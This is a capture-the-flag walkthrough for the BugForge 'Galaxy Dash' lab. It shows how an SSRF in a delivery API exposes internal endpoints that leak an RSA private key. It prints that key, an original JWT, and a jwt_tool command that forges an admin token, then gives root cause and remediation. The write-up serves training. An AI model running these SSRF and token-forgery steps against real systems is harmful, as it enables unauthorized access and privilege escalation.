---
layout: post
title:  "BugForge - Weekly - Galaxy Dash"
date:   2026-02-01 09:00
image:  /images/bug-forge/bugforge-logo.png
tags:   [ssrf,jwt-forgery]
categories: [BugForge,weekly,galaxy-dash]
---

# Weekly - Galaxy Dash
><br/><b>Vulnerabilities Covered:</b>
<br/>
Server-Side Request Forgery (SSRF)
<br/>
JWT Forgery via Leaked Private Key
<br/>
<br/>
<b>Summary:</b>
<br/>
This walkthrough demonstrates a Server-Side Request Forgery (SSRF) vulnerability in a delivery scheduling API where a user-controllable URL parameter is passed to a backend service without validation. By fuzzing the internal service endpoint, authentication paths were discovered that exposed both public and private RSA keys. The leaked private key was then used to forge a JWT token with an elevated admin role, bypassing authorization controls and retrieving the challenge flag from a privileged endpoint.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://app.bugforge.io/">Bugforge.io</a>
<br/>
<br/>

## Solution

### Step 1 - Application Analysis

Create a new account and schedule a delivery. Observe that the `POST /api/data` request includes a `url` parameter pointing to an internal service:

```json
"url":"services.internal-galaxydash-systems.io/shipping"
```

The fact that the application sends a request to an internal resource via a user-controllable URL suggests the endpoint may be vulnerable to Server-Side Request Forgery (SSRF).

---

### Step 2 - Fuzzing the Internal Service

![Data request](/images/bug-forge/weekly/galaxy-dash/ssrf/api-data-request.png)

Send the `POST /api/data` request to an automation tool and use the `/usr/share/seclists/Discovery/Web-Content/common.txt` wordlist to fuzz for additional internal endpoints on `services.internal-galaxydash-systems.io/`.

![Automation - data endpoint](/images/bug-forge/weekly/galaxy-dash/ssrf/api-data-auth-request.png)

The fuzzing reveals an `/auth` endpoint. Run the fuzzing again against this newly discovered path to enumerate deeper directory levels.

![Auth endpoint](/images/bug-forge/weekly/galaxy-dash/ssrf/auth-endpoint.png)

---

### Step 3 - Discovering Authentication Keys

Two additional endpoints are found under `/auth`: `private` and `public`.

![Public & private endpoints](/images/bug-forge/weekly/galaxy-dash/ssrf/public-private-endpoints.png)

The `/auth/private` endpoint returns an RSA private key for the `Galaxy Dash Internal Auth Service`. The `/auth/public` endpoint returns the corresponding public key. This is a critical information disclosure that can be leveraged to forge authentication tokens.

![Private key](/images/bug-forge/weekly/galaxy-dash/ssrf/private-key.png)


**Private Key:**
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAt+LfFE2LM/V+dzaCG8TSa3OXCKY9C5gIBaRjiSqz2zS4tskC
/rL+dePifWpXn97PVrKd0+cAPBQxnuJC5gwRleHJ8Mxt6zXMvr7G01umcguC5gxx
Q6iW0i+ZmVvKCh2tXcoUMq15itQkHT1XLsZ3a1udSynIzoYjFFUE0I5LWvLL/spk
FkVAbBPpn8QAon+Tsez/4bz6kbQ2hqyQlxT5WBovSTDYyE8fupqFAF1E92rQ9XN1
1LRcu/FaVqoHBfCQecE80YonQwc79Ki7YKh/JaGYtXE1YnboXuIuzT4dLGgfLQMe
EFVWHCSSWkDuHHppPA/6kC1qSr+0UgJSiG5XFwIDAQABAoIBAEcItF0u8VGyiVZ6
73rTpudMQTFdqmJCqgKn9K1lmhHZRWuSrf3+3i5jSDhjbpL66sRWfoJ/j0cmE98J
D4e3bMml7bD//4wnfb7Hip3WHy+aA8hjUROuWgi6y46C90K+IR0EdZX4DmYTOhoz
emy+zR3jR5lj/EbPaViu2QvJlBF+5M38ZmxKMeojLu0up+E5QLqTYzYqjN/ow4NF
Z0hS7lb4+KGO8SIdXnez5c6OeplNwuTezkExFlL5xgg9EIekTDNVqEed7WgoTDNx
UoVgqeAzk1vxfb+/N72Thy6O6tm4rxEB/cQk1e9Mh/ssyCnDEu1YmH7+DrCHZh6S
rAR9MfUCgYEA+/fCm1LR0yGpMxGsG685WndaWMrJ4V8+/+Nl6Y/jHIiWjS7q4Hc6
t3AJWMUJuxm6fOo7yQbvpTh+w7bvhdfnwHt3ybBqtIiVhqJ2rDP4S2s0z+fME7hp
Wxoa99uAmesttTq+vP+U8eN4xHk3kO0bUztojw84Uf7P1TRmhILKsoUCgYEAutQz
UTZwJ1PcRmtp2KUtmfJTneMff+4hOql5uPRQRIKMeuscPGPXrIqXq2z/oLN2aju1
HOZyxOlE7C5ppX/+aKmlYGjKF7mDBXyHdJC9S2WM7gUvxmLUW8xBfHFtp31b1gqg
VGdj1KZr/qmHfMJfOcEYSp5h+pjMGp1moUepy+sCgYEAkLx7j1l9qjg1x14pbSW0
XmEdBtBGMy3RNJBdZFMA9M0JHkSLKzGSCvlShSl6M33OAB9VBF71ngTb3HTjFhE1
0P2bi8HJKbcjnVkJrlWUFU6Z4auXMOTHsEtInoP6VXAgq2/5TPvLhT9TihjPcHKj
NaZ0o2jswz0KCcC1+vxejzkCgYBoiV+Fa45pkvTHukZpYFMZtouu5myzqkyRhE6F
fL6E9v8fr/oGmF8PPiULWFvYUVJKssnuN8uz/koAVR/r6Kgza+kK/tdFWxnCsiEg
yfQBAftPGzvWJ2pnSuzBcr5GX1BJfXykfY1QaSY4Qid7WU7rA+5Rojl0fJaHtda9
G1oYrQKBgEpCreGA6IPk6hSkfG07XcQEZFIwqYuGEOPfEiNsq2vCiepAqocwE8/O
S2BiGyXOjIIpJZiWdF+sP7LYJOBQKHUhuDZk39B3dy2+Bl2mfpVQ13hrJn0z0g8O
zFzeTMKTzAdXLxxXZifXGeGW3cf8/1JW85sN5TEK419nTT20Lcwx
-----END RSA PRIVATE KEY-----
```

**Public Key:**
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt+LfFE2LM/V+dzaCG8TS
a3OXCKY9C5gIBaRjiSqz2zS4tskC/rL+dePifWpXn97PVrKd0+cAPBQxnuJC5gwR
leHJ8Mxt6zXMvr7G01umcguC5gxxQ6iW0i+ZmVvKCh2tXcoUMq15itQkHT1XLsZ3
a1udSynIzoYjFFUE0I5LWvLL/spkFkVAbBPpn8QAon+Tsez/4bz6kbQ2hqyQlxT5
WBovSTDYyE8fupqFAF1E92rQ9XN11LRcu/FaVqoHBfCQecE80YonQwc79Ki7YKh/
JaGYtXE1YnboXuIuzT4dLGgfLQMeEFVWHCSSWkDuHHppPA/6kC1qSr+0UgJSiG5X
FwIDAQAB
-----END PUBLIC KEY-----
```

Note that the keys returned from the API contain `\n` escape sequences. Format them into proper PEM files using `echo -e` and redirect the output:

`echo -e '{PRIVATE_KEY} > private.key'`
`echo -e '{PUBLIC_KEY} > public.key'`

![Private key formatted and saved](/images/bug-forge/weekly/galaxy-dash/ssrf/private-key-formatted.png)

![Public key formatted and saved](/images/bug-forge/weekly/galaxy-dash/ssrf/public-key-formatted.png)

---

### Step 4 - Forging a JWT Token

Decode the original JWT token to understand its structure. The payload contains a `role` claim set to `user`.

Install `jwt_tool` to sign a modified token with the leaked private key:

**Original JWT Token:**
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJad2FydHMiLCJvcmdhbml6YXRpb25JZCI6NCwicm9sZSI6InVzZXIiLCJpYXQiOjE3NzA0NTk2MTh9.PXCU5fsAgkB02vdGTBcMTmhQ2U75WMKapB9eD7pfcsLp3zPJvzbJy1ju1sFt04OolPm_70aJCrEgE4t1kRh7qcVlK6LMKdweVjlLiJPQqlVdykCvL5lsl5tWah2T941Vn_GtHrNavmB0fGu53tjwC6Vrm7guxs2px7pNR1XtaBWI-hhLeFBqBMSotFQuO4CXAy2fBt-tnyxF9kvDM7Z6KrmJYQ3AcQBt0IB_PAb_C2nzNfaE7HBbW_jB4gsCL1UYMgOOeUp05_6QnUnQTQwEuuTI1LnLifl6Qb95qloUh0o7Up0ak1-4GrXPVeMlJMwvfJGR0de8hiAGZywdbm0bgg
```

Use `jwt_tool` to re-sign the token with the `role` claim changed from `user` to `admin`:

```bash
jwt_tool <original_token> --sign rs256 --privkey private.key --pubkey public.key -I -pc role -pv admin
```

![JWT Tool - New Token](/images/bug-forge/weekly/galaxy-dash/ssrf/jwt-tool-new-token.png)

This produces a new, validly signed JWT with administrative privileges.

---

### Step 5 - Retrieving the Flag

Replace the session token with the forged admin JWT and send a request to the application. The server accepts the token, and the flag is returned in the `X-Galaxy-Flag` response header.

![Flag](/images/bug-forge/weekly/galaxy-dash/ssrf/flag.png)

---

### Impact

- Access to internal services and infrastructure not intended to be publicly reachable
- Exposure of cryptographic private keys used for authentication token signing
- Complete bypass of role-based access controls via JWT forgery
- Ability to impersonate any user role, including administrative accounts
- Potential for lateral movement to other internal services accessible from the SSRF endpoint

---

### Vulnerability Classification

- **OWASP Top 10:** A10:2021 - Server-Side Request Forgery (SSRF)
- **Vulnerability Type:** Server-Side Request Forgery leading to JWT Forgery
- **Attack Surface:** Delivery scheduling API (`POST /api/data`) with user-controllable URL parameter
- **CWE:**
  - CWE-918 - Server-Side Request Forgery (SSRF)
  - CWE-321 - Use of Hard-Coded Cryptographic Key
  - CWE-311 - Missing Encryption of Sensitive Data

---

### Root Cause

The application passes a user-controllable `url` parameter directly to a backend HTTP request without validating or restricting the target. This allows an attacker to redirect the server-side request to arbitrary internal endpoints. The internal authentication service exposes its RSA key pair without access controls, compounding the issue by enabling token forgery. The combination of unrestricted SSRF and exposed cryptographic material allows a complete authentication bypass.

---

### Remediation

- Implement a strict allowlist of permitted internal URLs and hostnames for server-side requests
- Validate and sanitize all user-supplied URL parameters, rejecting internal/private IP ranges and hostnames
- Restrict access to internal authentication services and key material using network segmentation and access controls
- Store cryptographic keys securely using a secrets management solution rather than exposing them via API endpoints
- Implement mutual TLS or API authentication between internal services to prevent unauthorized access
- Add monitoring and alerting for unusual internal service access patterns

---